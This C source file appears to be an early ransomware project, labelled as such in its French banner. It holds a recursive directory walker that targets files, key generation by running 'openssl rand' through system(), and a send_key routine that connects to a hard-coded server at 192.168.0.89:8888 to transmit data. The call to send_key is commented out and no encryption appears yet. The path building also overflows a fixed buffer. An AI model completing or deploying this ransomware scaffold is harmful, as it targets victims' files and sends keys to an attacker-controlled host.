#include "ransomlib.h"
#include <dirent.h> // for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>


void usage()
{
	printf("--------------------------------------\n");
	printf("Bienvenue sur le projet de Ransomware\n");
	printf("--------------------------------------\n");
};

int is_encrypted(char *filename);

//void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
void listdir(const char *name)
{

	DIR* dir = opendir(name);
	if (dir == NULL)
	{
		return;
	}
	struct dirent* entity;
	entity = readdir(dir);

	//    d_name = entity->d_name;
	//    d_type = entity->d_type;

	while (entity != NULL)
	{
		 if (entity->d_name[0] != '.')
		 {
			printf("[type of folder : %d]  %s/%s\n",entity->d_type,name,entity->d_name);
		 }
		if(entity->d_type == DT_DIR && strcmp(entity->d_name,".")!=0 && strcmp(entity->d_name,"..")!=0)
		{
			// if(strcmp(d_name, ".")!=0)
			char path[100] = {0};
			strcat(path,name);
			strcat(path,"/");
			strcat(path,entity->d_name);
			listdir(path);
		}
		entity = readdir(dir);
	}
	closedir(dir);
}

//int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
int generate_key()
{
	// int *nb = 0;  
    // printf("Quel est la taille de la clé ? ", nb);
    // scanf("%d", &nb);
	
	char command[1000];
	stpcpy(command, "openssl rand -hex ");
	// printf("%d\n", nb);
	strcat(command, "8");
	printf("%s", command);
	system(command);
}

//int send_key(char *pKey, char *pIv);
int send_key()
{
	int sockid;
	int server_port = 8888;
	char *server_ip = "192.168.0.89";
	
	sockid = socket(AF_INET,SOCK_STREAM,0);
	
	struct sockaddr_in server_addr;
	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(server_port);
	server_addr.sin_addr.s_addr = inet_addr(server_ip);
	
	char *msg = "hello";
	
	connect(sockid,(struct sockaddr *)&server_addr, sizeof(server_addr));
	
	send(sockid, (const char *)msg, strlen(msg), 0);
	
	close(sockid);
}

int main (int argc, char * argv[])
{
	usage();
	if(argc==1)
	{
		printf("./e <PATH>");
	}
	else if(argc==2)
	{
		printf("The directory is %s\n", argv[1]);
		listdir(argv[1]);
		generate_key();
		//send_key();
	}
}
